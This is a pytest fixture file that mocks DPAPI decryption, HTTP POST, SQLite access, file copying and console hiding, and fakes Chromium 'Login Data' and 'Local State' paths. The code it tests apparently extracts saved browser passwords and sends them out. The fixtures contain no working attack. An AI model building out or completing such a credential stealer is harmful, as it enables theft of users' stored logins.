import pytest
from unittest.mock import MagicMock, patch
from pathlib import Path

@pytest.fixture(autouse=True)
def disable_sensitive_calls(mocker):
    """
    Global fixture to ensure no real OS or network calls happen during tests.
    """
    # Mock win32crypt to avoid DPAPI calls
    mocker.patch("win32crypt.CryptUnprotectData", return_value=(None, b"fake_decrypted_data"))
    
    # Mock requests to avoid real HTTP calls
    mocker.patch("requests.post", return_value=MagicMock(status_code=200, text="OK"))
    
    # Mock sqlite3 to avoid real DB connections
    mocker.patch("sqlite3.connect")
    
    # Mock shutil.copy2 to avoid real file copying
    mocker.patch("shutil.copy2")
    
    # Mock ctypes to avoid hiding console in tests
    mocker.patch("ctypes.windll.kernel32.GetConsoleWindow", return_value=None)
    mocker.patch("ctypes.windll.user32.ShowWindow")

@pytest.fixture
def mock_chromium_paths(mocker):
    """
    Fixture to provide a fake environment for Chromium browsers.
    """
    mock_env = {
        "LOCALAPPDATA": "C:\\Users\\FakeUser\\AppData\\Local",
        "APPDATA": "C:\\Users\\FakeUser\\AppData\\Roaming"
    }
    mocker.patch("os.environ.get", side_effect=lambda k, d=None: mock_env.get(k, d))
    
    # Mock Path.exists to return True for expected files
    original_exists = Path.exists
    def side_effect_exists(self):
        if "Local State" in str(self) or "Login Data" in str(self) or "User Data" in str(self):
            return True
        return False
    
    mocker.patch.object(Path, "exists", side_effect=side_effect_exists, autospec=True)
    return mock_env
